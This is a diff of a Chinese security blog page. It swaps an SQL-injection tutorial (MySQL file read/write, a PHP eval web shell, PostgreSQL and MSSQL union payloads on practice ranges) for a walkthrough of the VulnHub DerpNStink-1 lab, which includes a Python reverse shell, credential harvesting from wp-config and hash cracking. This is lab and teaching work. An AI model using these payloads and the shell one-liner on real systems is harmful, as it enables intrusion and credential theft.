@@ -4,14 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="SQL注入漏洞分析">
-    <meta name="description" content="前言：
-
-上一篇文章分析SQL注入漏洞，针对数据库类型以及高权限注入没有完全分析完，这一篇文章接着分析。
-
-不通数据库类型权限操作区分：
-Access 无高权限注入点-只能猜解，而且暴力猜解，也可以根据它数据库的特性猜解
-MYSQL，Pos">
+    <meta name="keywords" content="DERPNSTINK-1靶机详解">
+    <meta name="description" content="靶机基本信息
+靶机地址：https://www.vulnhub.com/entry/derpnstink-1,221/
+靶机难度：中等（CTF）靶机描述：这是基于Ubuntu的boot2root虚拟机。它已使用DHCP设置的网络接口在VMw">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -23,7 +19,7 @@ MYSQL，Pos">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SQL注入漏洞分析(二) | 阿浩の博客</title>
+    <title>DERPNSTINK-1靶机详解 | 阿浩の博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -412,12 +408,12 @@ MYSQL，Pos">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/29.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">SQL注入漏洞分析(二)</h1>
+                    <h1 class="description center-align post-title">DERPNSTINK-1靶机详解</h1>
                 </div>
             </div>
         </div>
@@ -445,8 +441,12 @@ MYSQL，Pos">
                                 <span class="chip bg-color">渗透测试</span>
                             </a>
                         
-                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
-                                <span class="chip bg-color">漏洞分析</span>
+                            <a href="/tags/vulnhub/">
+                                <span class="chip bg-color">vulnhub</span>
+                            </a>
+                        
+                            <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                                <span class="chip bg-color">靶机</span>
                             </a>
                         
                     </div>
@@ -470,21 +470,21 @@ MYSQL，Pos">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-06-01
+                    2023-11-01
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-06-03
+                    2023-11-01
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.5k
+                    897
                 </div>
                 
 
@@ -509,150 +509,132 @@ MYSQL，Pos">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><strong>前言：</strong></p>
+                <h2 id="靶机基本信息">靶机基本信息</h2>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/derpnstink-1,221/">https://www.vulnhub.com/entry/derpnstink-1,221/</a><br>
+靶机难度：中等（CTF）靶机描述：这是基于Ubuntu的boot2root虚拟机。它已使用DHCP设置的网络接口在VMware Fusion和VMware Workstation12上进行了测试。它旨在模拟我在OSCP实验室中遇到的一些较早的机器，同时还带有一些较小的曲线球，但是没有什么花哨的。坚持经典的黑客方法，并列举所有内容！目标：找到所有4个标志，最终将您带到完全root访问权限</p>
+<h2 id="主机发现">主机发现</h2>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012137473.png" alt=""></p>
+<p>也可以使用<mark>nmap</mark>进行主机发现</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012137097.png" alt=""></p>
+<h2 id="信息收集">信息收集</h2>
+<p>全端口扫描：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012137172.png" alt=""></p>
+<p>详细的扫描：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012137384.png" alt=""></p>
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.255.9">http://192.168.255.9</a>，查看源代码：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012138094.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012153696.png" alt=""></p>
+<p>发现flag1</p>
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.255.9/webnotes/info.txt">http://192.168.255.9/webnotes/info.txt</a></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012138634.png" alt=""></p>
+<p>翻译： @stinky，确保使用本地 dns 更新您的主机文件，以便可以在新的 derpnstink 博客上线之前访问它</p>
+<p>意思是要我们更新本地的dns服务，才能访问博客</p>
+<p><strong>修改本地的hosts文件：</strong></p>
+<p>命令：<code>sudo vim /etc/hosts</code></p>
+<p><code>192.168.255.9 derpnstink.local</code></p>
+<p><strong>目录扫描：</strong></p>
+<p><code>dirb http://derpnstink.local/ </code></p>
+<p>部分结果：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012138080.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012138621.png" alt=""></p>
+<p>从这个目录来看，就可以确认为worpress站</p>
+<p>访问<a target="_blank" rel="noopener" href="http://derpnstink.local/weblog/wp-admin/admin.php">http://derpnstink.local/weblog/wp-admin/admin.php</a></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012138289.png" alt=""></p>
+<p>尝试弱口令登录：</p>
+<p>admin/admin</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012138182.png" alt=""></p>
+<h2 id="漏洞发现与利用">漏洞发现与利用</h2>
+<p>使用<mark>wpscan</mark>进行扫描：</p>
+<p>命令：<code>wpscan --url http://derpnstink.local/weblog/</code></p>
+<p>结果：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012138741.png" alt=""></p>
+<p><strong>使用AWVS扫描：</strong></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012138640.png" alt=""></p>
+<p><strong>利用MSF：</strong></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012138128.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012138738.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012139717.png" alt=""></p>
+<p><strong>拿个稳定shell：</strong></p>
+<p>反弹shell代码：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.255.129",6677));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012139882.png" alt=""></p>
+<p>反弹成功：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012139502.png" alt=""></p>
+<p>cd …/…/…    —来到/var/www/html/weblog目录枚举信息</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012139065.png" alt=""></p>
+<p><code>cat wp-config.php</code></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012139544.png" alt=""></p>
+<p>mysql账号密码获得：<br>
+root<br>
+mysql</p>
+<p><strong>登录mysql信息枚举：</strong></p>
+<p>后台枚举前面dirb扫描出：<br>
+<a target="_blank" rel="noopener" href="http://derpnstink.local/php/phpmyadmin/">http://derpnstink.local/php/phpmyadmin/</a></p>
+<p>访问，使用刚才从<mark>wp-config.php</mark>文件中获取的用户名密码登录</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012139445.png" alt=""></p>
+<p><code>show databases;</code></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012139927.png" alt=""></p>
+<p><code>use wordpress;</code></p>
+<p><code>show tables;</code></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012139016.png" alt=""></p>
+<p><code>select * from wp_users;</code></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012139236.png" alt=""></p>
+<p>获得账户密码：</p>
+<p><code>unclestinky</code></p>
+<p><code>$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41</code></p>
+<p><code>admin</code></p>
+<p><code>$P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/</code></p>
+<p><strong>爆破密码：</strong></p>
+<p><code>echo '$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41' &gt; 1.txt</code></p>
+<p>用hash-identifier值去查看是什么类型的密码加密</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012139327.png" alt=""></p>
+<p>使用暴破出的用户名/密码：unclestinky/wedgie57进行登录</p>
+<p>之前目录爆破出来的后台路径：<a target="_blank" rel="noopener" href="http://derpnstink.local/weblog/wp-admin/">http://derpnstink.local/weblog/wp-admin/</a></p>
+<p>利用刚才爆破出来的账户密码进行登录，登录成功后发现flag2：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012140822.png" alt=""></p>
+<p>在靶机home目录下发现两个用户，mrderp/stinky</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012140025.png" alt=""></p>
+<p>利用这两个用户名结合之前爆破出来的密码wedgie57</p>
+<p>尝试ssh登录：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012140190.png" alt=""></p>
+<p>根据之前的端口扫描结果，这个靶机还开放ftp服务</p>
+<p>尝试ftp登录：</p>
+<p>1、对于mrderp这个用户名：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012140310.png" alt=""></p>
+<p>登录失败</p>
+<p>2、对于stinky这个用户名</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012140070.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012140797.png" alt=""></p>
+<p>查看<mark>key.txt</mark>的内容：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012140930.png" alt=""></p>
+<p>这是ssh的key密钥，保存到本地key.txt文件中</p>
+<p><strong>尝试ssh登录：</strong></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012140209.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012140460.png" alt=""></p>
+<p>成功获取flag3</p>
+<h2 id="权限提升">权限提升</h2>
+<p>查看内核版本信息：<code>lsb_release -a</code></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012140799.png" alt=""></p>
+<p>这个系统版本可使用<mark>cve-2021-4034</mark>：</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/laobanjiull/article/details/122715651">https://blog.csdn.net/laobanjiull/article/details/122715651</a></p>
 <blockquote>
-<p>上一篇文章分析SQL注入漏洞，针对数据库类型以及高权限注入没有完全分析完，这一篇文章接着分析。</p>
+<p>这种我尝试过，尝试不成功</p>
 </blockquote>
-<p><strong>不通数据库类型权限操作区分：</strong></p>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Access 无高权限注入点-只能猜解，而且暴力猜解，也可以根据它数据库的特性猜解
-MYSQL，PostgreSQL，MSSQL 高权限注入点-可升级读写执行等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h2 id="MySQL-root高权限读写注入">MySQL-root高权限读写注入</h2>
-<p><strong>读取文件：</strong></p>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>==load_file()==是读取文件函数</p>
-</li>
-</ul>
-<p>读取本地文件示例：</p>
-<p><code>select load_file('c:/1.txt');</code></p>
-<p>从注入点测试示例，测试代码：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
-//声明文件解析的编码格式
-header('Content-type:text/html;charset=utf-8');
-//操作数据库讲数据取出进行展示
-$conn=mysql_connect('localhost','root','root');
-mysql_select_db('beescms',$conn);
-
-$i=$_GET['id'];//GET请求接受id参数名值给变量i
-$sql="select * from bees_article where id='$i'";
-$result=mysql_query($sql,$conn); //执行sql语句
-
-while($row=mysql_fetch_array($result)){
-    echo '&lt;br&gt;&lt;br&gt;&lt;hr&gt;';
-    echo $row['id'];
-    echo $row['content'];
-}
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>测试结果：</p>
-<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306012253958.png" alt=""></p>
-<p>说明在高权限条件下可以读取文件</p>
-<p><strong>写入文件：</strong></p>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>into outfile</p>
-</li>
-<li class="lvl-2">
-<p>into dumpfile</p>
-</li>
-</ul>
-<p>本地写入命令：</p>
-<p><code>select 'xxx' into outfile 'c:/test.txt';</code></p>
-<p>从测试点注入测试：</p>
-<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306012253433.png" alt=""></p>
-<p>虽然好像有个报错，我也不太清楚那是怎么回事（可能是代码的处理问题），但是可以看得在高权限条件下是可以进行文件写入，只要把要写入的内容换成后门代码便可以实现后面getshell的进一步操作</p>
-<blockquote>
-<p>简单后门代码：<br>
-<code>&lt;?php eval($_POST[x]);?&gt;</code></p>
-</blockquote>
-<p>有了文件读取，那么接下来考虑一个问题，就是黑盒测试，怎么判断路径</p>
-<p><strong>路径的获取：</strong></p>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>phpinfo.php</p>
-<p>针对phpinfo.php文件，从开发者的角度，有可能是开发网站时测试遗留的；从安全测试人员的角度，可以通过利用写入文件权限写入，也可以通过利用网站的上传漏洞上传phpinfo文件（前提是网站有文件上传漏洞）</p>
-</li>
-<li class="lvl-2">
-<p>报错</p>
-<p>这可以测试尝试，得网站代码如何，有代码容错处理那种会报错一个异常错误，可能包含路径</p>
-</li>
-<li class="lvl-2">
-<p>字典</p>
-</li>
-</ul>
-<p><strong>写入文件阻碍：</strong></p>
-<p>无法写入：secure_file_priv 突破 注入中需要支持 SQL 执行环境，没有就需要借助 phpmyadmin 或能够直接连上对方数据库进行绕过</p>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">secure_file_priv 限制文件的读写，限制操作路径，比如`secure_file_priv=c:/`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><strong>解决方法：</strong></p>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">set global slow_query_log=1; //开启慢日志
-set global slow_query_log_file='shell 路径';
-select '&lt;?php eval($_GET[A])?&gt;' or SLEEP(1);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h2 id="PostgreSQL-高权限读写注入">PostgreSQL-高权限读写注入</h2>
-<p>这里用墨者的一个靶场演示，靶场链接：<a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/86">https://www.mozhe.cn/bug/detail/86</a></p>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">测试字段:
-order by 4 #不报错
-order by 5 #报错
-and 1=2 union select null,null,null,null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<blockquote>
-<p>注：这个和mysql注入有区别</p>
-</blockquote>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">测显位:
-and 1=2 union select 'null',null,null,null 错误
-and 1=2 union select null,'null',null,null 正常
-and 1=2 union select null,null,'null',null 正常
-and 1=2 union select null,null,null,'null' 错误
-#得出显位是第 2，3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取信息：
-and 1=2 UNION SELECT null,version(),null,null #获取数据库版本信息 PostgreSQL 9.5.13
-and 1=2 UNION SELECT null,current_user,null,null #获取当前用户 postgres
-and 1=2 union select null,current_database(),null,null #获取当前数据库 mozhedvcms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取数据库名：
-and 1=2 union select null,string_agg(datname,','),null,null from 
-pg_database #s所有数据库名：template1,template0,postgres,mozhedvcms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<blockquote>
-<p>string_agg获取所有，相当于mysql的group_concat()函数</p>
-</blockquote>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取表名：
-and 1=2 union select null,string_agg(tablename,','),null,null 
-from pg_tables where schemaname='public' #表名：notice,reg_users
-and 1=2 union select null,string_agg(relname,','),null,null 
-from pg_stat_user_tables #表名：reg_users,notice<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取列名：
-and 1=2 union select null,string_agg(column_name,','),null,null 
-from information_schema.columns where table_name='reg_users' #得到列名：id,name,password,status<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取数据：
-and 1=2 union select null,string_agg(name,','),string_agg(password,','),null from reg_users<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>最后得到的密码进行md5解密，后登录，注意这里有个小坑，用户名是mozhe1，不是mozhe</p>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">补充-获取dba用户（同样在DBA用户下，是可以进行文件读写的）：
-and 1=2 union select null,string_agg(usename,','),null,null FROM pg_user WHERE usesuper IS TRUE
-如列出当前目录：
-and 1=2 union select null,pg_ls_dir('./'),null,null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><strong>postgresql</strong>注入参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/249371.html">https://www.freebuf.com/sectool/249371.html</a></p>
-<h2 id="MSSQL-sa-高权限读写执行注入">MSSQL-sa 高权限读写执行注入</h2>
-<p>这里用墨者的一个靶场来演示，靶场链接：<a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/90">https://www.mozhe.cn/bug/detail/90</a></p>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">测列数：
-order by 4 #不报错
-order by 5 #报错，说明字段为4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">测显位：
-and 1=2 union all select 'null',null,null,null #无显位
-and 1=2 union all select null,'null',null,null #有显位
-and 1=2 union all select null,null,‘null’,null #有显位
-and 1=2 union all select null,null,null,‘null’ #没显位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取信息：
-and 1=2 union all select null,@@version,null,null #获取版本信息
-db_name() 当前数据库名字
-user、system_user,current_user,user_name 获取当前用户名
-and 1=2 union all select null,@@SERVERNAME,null,null 获取服务器主机信息
-and 1=2 union all select null,db_name(),null,null #获取数据库<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取表名：
-and 1=2  union all select null,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype='u'),null,null
-union all select null,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype='u' and name not in ('manage')),null,null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取列名：
-and 1=2  union all select null,(select top 1 col_name(object_id('manage'),1) from sysobjects),null,null
-and 1=2  union all select null,(select top 1 col_name(object_id('manage'),2) from sysobjects),null,null
-and 1=2  union all select null,(select top 1 col_name(object_id('manage'),3) from sysobjects),null,null
-and 1=2  union all select null,(select top 1 col_name(object_id('manage'),4) from sysobjects),null,null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取数据：
-and 1=2 union all select null,username, password ,null from manage<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>过滤语法：<code>http.request.method == "POST"</code></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012140210.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012141926.png" alt=""></p>
+<p>获取账户：mrderp，密码：derpderpderpderpderpderpderp</p>
+<p>利用刚才获取的账户密码登录，：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012141122.png" alt=""></p>
+<p>写入脚本覆盖derpy：</p>
+<p><code>cd /tmp</code></p>
+<p><code>vi test.sh</code></p>
+<p>代码：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">#!/bin/bash
+bash -i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012141647.png" alt=""></p>
+<p>读取<mark>root</mark>目录下<mark>Desktop</mark>的flag.txt：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202311012141989.png" alt=""></p>
 <blockquote>
 <p>免责声明：本文章涉及的知识和技能仅用于学习研究，如有用于非法途径或未被授权的真实网络环境，所造成的后果及连带责任自行承担，与本文作者无关，倡导把安全知识和技能用于正当、正规、正义的途径。</p>
 </blockquote>
@@ -682,7 +664,7 @@ and 1=2 union all select null,username, password ,null from manage<span aria-hid
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.ahao8.top/posts/9afe.html">https://www.ahao8.top/posts/9afe.html</a>
+                    <a href="https://www.ahao8.top/posts/da0.html">https://www.ahao8.top/posts/da0.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -724,8 +706,12 @@ and 1=2 union all select null,username, password ,null from manage<span aria-hid
                                     <span class="chip bg-color">渗透测试</span>
                                 </a>
                             
-                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
-                                    <span class="chip bg-color">漏洞分析</span>
+                                <a href="/tags/vulnhub/">
+                                    <span class="chip bg-color">vulnhub</span>
+                                </a>
+                            
+                                <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                                    <span class="chip bg-color">靶机</span>
                                 </a>
                             
                         </div>
@@ -1051,17 +1037,18 @@ and 1=2 union all select null,username, password ,null from manage<span aria-hid
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/posts/743c.html">
+                <a href="/posts/da0.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/loading.gif" data-original="/medias/featureimages/23.jpg" class="responsive-img" alt="ASP安全分析">
+                        <img src="/medias/loading.gif" data-original="/medias/featureimages/21.jpg" class="responsive-img" alt="DERPNSTINK-1靶机详解">
                         
-                        <span class="card-title">ASP安全分析</span>
+                        <span class="card-title">DERPNSTINK-1靶机详解</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1071,9 +1058,9 @@ and 1=2 union all select null,username, password ,null from manage<span aria-hid
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-06-02
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-11-01
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1086,6 +1073,7 @@ and 1=2 union all select null,username, password ,null from manage<span aria-hid
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1093,12 +1081,12 @@ and 1=2 union all select null,username, password ,null from manage<span aria-hid
                         <span class="chip bg-color">渗透测试</span>
                     </a>
                     
-                    <a href="/tags/ASP%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">ASP安全</span>
+                    <a href="/tags/vulnhub/">
+                        <span class="chip bg-color">vulnhub</span>
                     </a>
                     
-                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
-                        <span class="chip bg-color">漏洞分析</span>
+                    <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                        <span class="chip bg-color">靶机</span>
                     </a>
                     
                 </div>
@@ -1112,12 +1100,12 @@ and 1=2 union all select null,username, password ,null from manage<span aria-hid
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/5a5a.html">
+                <a href="/posts/3b91.html">
                     <div class="card-image">
                         
-                        <img src="/medias/loading.gif" data-original="/medias/featureimages/31.jpg" class="responsive-img" alt="SQL注入漏洞分析(一)">
+                        <img src="/medias/loading.gif" data-original="/medias/featureimages/33.jpg" class="responsive-img" alt="LordOfTheRoot_1.0.1靶机详解">
                         
-                        <span class="card-title">SQL注入漏洞分析(一)</span>
+                        <span class="card-title">LordOfTheRoot_1.0.1靶机详解</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1128,7 +1116,7 @@ and 1=2 union all select null,username, password ,null from manage<span aria-hid
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-06-01
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-10-31
                             </span>
                         <span class="publish-author">
                             
@@ -1149,8 +1137,12 @@ and 1=2 union all select null,username, password ,null from manage<span aria-hid
                         <span class="chip bg-color">渗透测试</span>
                     </a>
                     
-                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
-                        <span class="chip bg-color">漏洞分析</span>
+                    <a href="/tags/vulnhub/">
+                        <span class="chip bg-color">vulnhub</span>
+                    </a>
+                    
+                    <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                        <span class="chip bg-color">靶机</span>
                     </a>
                     
                 </div>
